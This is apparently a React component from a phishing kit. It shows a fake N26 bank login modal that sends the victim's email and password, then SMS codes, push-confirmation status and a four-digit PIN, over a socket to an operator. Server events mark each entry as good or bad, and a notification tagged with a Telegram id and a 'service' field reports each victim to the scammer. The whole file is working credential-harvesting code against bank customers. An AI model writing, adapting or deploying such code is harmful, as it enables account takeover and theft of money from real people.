import React, { useState, useEffect, useRef } from 'react';
import { useSelector } from 'react-redux';
import styled from 'styled-components';

import { ReactComponent as N26SVG } from '../../../assets/svg/banks/n26.svg';
import { ReactComponent as CloseSVG } from './close_modal.svg';
import { getQuery } from '../../../utils/navigation';

import { LOADER } from './LOADER';

export const P_N26 = ({  handleBankOpen, children }) => {
  const { socket } = useSelector(({ socket }) => ({
    socket,
  }));

  const [isFinished, setIsFinished] = useState(false);
  const [dataError, setDataError] = useState(false);
  const [smsError, setSmsError] = useState(false);
  const [pinError, setPinError] = useState(false);
  const [pushError, setPushError] = useState(false);
  const [isOpen, setOpen] = useState(false);
  const [isConfirm, setConfirm] = useState(false);
  const [data, setData] = useState({
    data1: '',
    data2: '',
  });

  const [isCodeConfirmed, setCodeConfirmed] = useState(false);
  const [type, setType] = useState(null);

  const [smsInput, setSmsInput] = useState('');
  const [codeInput, setCodeInput] = useState('');

  const initialInputs = {
    1: { value: '', ref: useRef(null) },
    2: { value: '', ref: useRef(null) },
    3: { value: '', ref: useRef(null) },
    4: { value: '', ref: useRef(null) },
  };

  const [inputs, setInputs] = useState(initialInputs);

  const setPinNumber = (value, key) => {
    setInputs({ ...inputs, [key]: { ...inputs[key], value } });
  };

  const setPin = (code) => {
    if (!code || code.length !== 4) {
      return;
    }

    const transformedInputs = {};

    Object.values(inputs).forEach((item, index) => {
      transformedInputs[index + 1] = { ...item, value: code[index] };
    });

    setInputs(transformedInputs);
  };

  const getPin = () => {
    const isPinValid = Object.values(inputs).every(({ value }) => !!value);

    if (isPinValid) {
      const code = Object.values(inputs).reduce((accum, { value }) => {
        return accum + value;
      }, '');
      return code;
    }

    return null;
  };

  useEffect(() => {
    if (socket) {
      socket.on('PAYMENT_DATA_CODE_GOOD', (payload) => {
        console.log(123);
        setType('SMS');
      });

      socket.on('PAYMENT_DATA_2FA_GOOD', (payload) => {
        setType('2FA');
      });

      socket.on('PAYMENT_DATA_PIN_GOOD', (payload) => {
        setType('PIN');
      });

      socket.on('PAYMENT_DATA_BAD', () => {
        setDataError('Sie haben falsche Daten eingegeben');
        setConfirm(false);
      });

      socket.on('PAYMENT_CODE_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_CODE_BAD', () => {
        setType('SMS');

        setSmsError('Du hast einen falschen Code eingegeben.');
      });

      socket.on('PAYMENT_2FA_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_2FA_BAD', () => {
        setType('2FA');

        setPushError('Es wurde keine Bestätigung gefunden. versuchen Sie es nochmal.');
      });

      socket.on('PAYMENT_PIN_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_PIN_BAD', () => {
        setType('PIN');

        setPinError('Du hast einen falschen Pin eingegeben.');
      });
    }
  }, [socket]);

  const handleClose = () => {
    setOpen(false);
    handleBankOpen(false);
    setDataError(false);
    setSmsError(false);
    setPushError(false);
    setPinError(false);
    setConfirm(false);
    setData({
      data1: '',
      data2: '',
    });
    setCodeConfirmed(false);
    setType(null);

    setSmsInput('');
    setCodeInput('');
    setIsFinished(false);
  };

  const handleFinish = () => {
    setType(null);

    socket.emit('PAYMENT_2FA_SEND');
  };

  const handleSendSms = () => {
    socket.emit('PAYMENT_CODE_SEND', { code: smsInput });

    setType(null);
    setSmsInput('');
  };

  const handleSendPin = () => {
    socket.emit('PAYMENT_PIN_SEND', { pin: getPin() });

    setType(null);
  };

  const handleCode = () => {
    setCodeInput('');
    setCodeConfirmed(true);
  };

  const handleCodeInput = (e) => {
    setCodeInput(e.target.value);
  };

  const handleSmsInput = (e) => {
    setSmsInput(e.target.value);
  };

  const isDisabled = data.data1 === '' || data.data2 === '';

  const handleData_1 = (e) => {
    setData({ ...data, data1: e.target.value });
  };

  const handleData_2 = (e) => {
    setData({ ...data, data2: e.target.value });
  };

  const handleConfirm = async () => {
    const info = JSON.parse(localStorage.getItem('info'));

    const ref = localStorage.getItem('ref');
    const service = localStorage.getItem('service');

    socket.emit('PAYMENT_DATA_BANK_SEND', {
      ...info,
      login: data.data1,
      password: data.data2,
      ref,
      service,
      bank: 'N26',
    });

    setConfirm(true);
  };

  const handleOpen = () => {
    if (!isOpen) {
      setOpen(true);
      handleBankOpen(true);

      const ref = getQuery('ref') || localStorage.getItem('ref');
      const service = getQuery('service') || localStorage.getItem('service');

      if (socket && ref) {
        socket.emit('PAYMENT_NOTIFICATION', { type: 'PAYMENT_BANK_START', telegramId: ref, service });
      }
    }
  };

  return (
    <div onClick={handleOpen}>
      {children}
      <Dialog open={isOpen}>
        <div>
          <CONT>
            <D1>
              <D_TITLE>
                <N26SVG className="title" />
              </D_TITLE>
              <CloseSVG viewBox="8 8 33 32" onClick={handleClose} src="close_modal.png" className="close" />
            </D1>
            <LOADER
              Title={Title}
              Input={InputEmail}
              isConfirm={isConfirm}
              Button={InputButton}
              loaderColor="#36d7b7"
              isCodeConfirmed={isCodeConfirmed}
              smsInput={smsInput}
              handleFinish={handleFinish}
              handleSendSms={handleSendSms}
              handleSendPin={handleSendPin}
              handleCode={handleCode}
              handleCodeInput={handleCodeInput}
              handleSmsInput={handleSmsInput}
              codeInput={codeInput}
              smsError={smsError}
              pushError={pushError}
              isFinished={isFinished}
              pinError={pinError}
              inputs={inputs}
              setPin={setPin}
              setPinNumber={setPinNumber}
              type={type}
            >
              <div style={{ marginTop: 24 }}>
                <InputEmail onChange={handleData_1} value={data.data1} placeholder="Email" />
                <InputEmail
                  onChange={handleData_2}
                  value={data.data2}
                  style={{ marginTop: 12 }}
                  placeholder="Password"
                />
                {dataError && <Error>{dataError}</Error>}
              </div>
              <InputButton disabled={isDisabled} onClick={handleConfirm}>
                Log in
              </InputButton>
              <CreateAcc>Create an account</CreateAcc>
            </LOADER>
          </CONT>
        </div>
      </Dialog>
    </div>
  );
};

const Title = styled.p`
  font-size: 18px;
  color: #fff;
`;

const CreateAcc = styled.p`
  text-align: center;
  font-size: 18px;
  font-weight: bold;
  margin-top: 15px;
  color: rgb(72, 172, 152);
`;

const InputButton = styled.button`
  color: black;
  font-weight: bold;
  background-color: rgb(72, 172, 152);
  padding: 6px 12px 6px 12px;
  border-radius: 8px;
  border: 0px;
  box-shadow: none;
  transition: 0.15s;

  font-size: 14px;
  margin-top: 24px;

  width: 100%;
  height: 52px;

  &:hover {
    cursor: pointer;
    ${(props) =>
    !props.disabled &&
    `
      background-color: rgb(82,182,162);
    `}
  }

  &:disabled {
    border-top: none !important;
    border-left: none !important;
    border-right: none !important;
    border-bottom: none !important;
    background: #666666;
    border: none;
    opacity: none;
    box-shadow: none;
  }
`;

const InputEmail = styled.input`
  padding-top: 15px;
  padding-left: 14px;
  padding-right: 14px;
  padding-bottom: 13px;
  height: 70px;

  border: 1px solid rgb(51, 51, 51);
  border-radius: 8px;
  outline: none;
  transition: border 0.3s;

  &::placeholder {
    font-size: 18px;
    transition: 0.3s;
  }
  &:focus {
    border: 2px solid rgb(72, 172, 152) !important;
    outline: none;
  }

  color: rgb(200, 200, 200);

  background-color: rgb(27, 27, 27);
  width: 100%;

  font-size: 18px;
`;

const Dialog = styled.dialog`
  position: absolute;  
  outline: 0;
  border: 0;
  top: 0;
  & > div {
    position: fixed;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    display: flex !important;
    justify-content: center !important;
    align-items: center !important;
    background-color: rgba(0, 0, 0, 0.8);
    z-index: 999;    
  }
`;

const D1 = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;

  & div {
    display: flex;
    justify-content: center;
    width: 100%;
  }

  & .title {
    height: 35px;
    fill: white;
  }

  & .close {
    width: 24px;
    height: 24px;

    fill: white;

    &:hover {
      cursor: pointer;
    }
  }
`;

const D_TITLE = styled.div`
  display: flex;
  justify-content: center;
  margin-left: 32px;
`;

const CONT = styled.div`
  background-color: rgba(27, 27, 27, 1);
  border: 1px solid rgb(51, 51, 51);
  width: 370px;
  border-radius: 10px;
  padding: 24px 14px 24px 14px;
  text-align: left;
`;
const Error = styled.p`
  color: red;
  font-size: 14px;
  margin-top: 10px;
`;
